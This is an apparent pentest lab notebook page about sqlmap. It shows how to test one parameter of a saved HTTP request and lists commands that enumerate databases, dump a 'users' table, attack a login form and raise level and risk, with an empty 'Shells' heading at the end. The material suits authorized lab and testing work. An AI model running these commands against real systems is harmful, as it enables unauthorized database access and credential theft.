## Current operation: Test one parameter in a captured request

**Run in:** Kali. **Requires:** A saved HTTP request that works unchanged, a selected parameter and valid session/CSRF handling.

```bash
sqlmap -r request.txt -p PARAMETER --batch
```

**Read the result:** Preserve a valid authenticated request and select the input before interpreting confirmed technique and DBMS evidence.

**If The replay is redirected to login or responses vary unpredictably:** An expired session or CSRF failure cannot be repaired by increasing level/risk; database access and OS execution remain separate outcomes.

### Example 2: Earlier notebook reference

Run in: **Saved lab example**.

```bash
sqlmap -r request.txt --batch                 # from a saved raw request
sqlmap -u "http://$IP/item?id=1" --batch --dbs
sqlmap -u "http://$IP/item?id=1" -D shop --tables
sqlmap -u "http://$IP/item?id=1" -D shop -T users --dump
# Auth / cookies / POST
sqlmap -u "http://$IP/login" --data "user=a&pass=b" -p user
sqlmap -u "http://$IP/x" --cookie "PHPSESSID=..." --level 5 --risk 3
# Shells
```
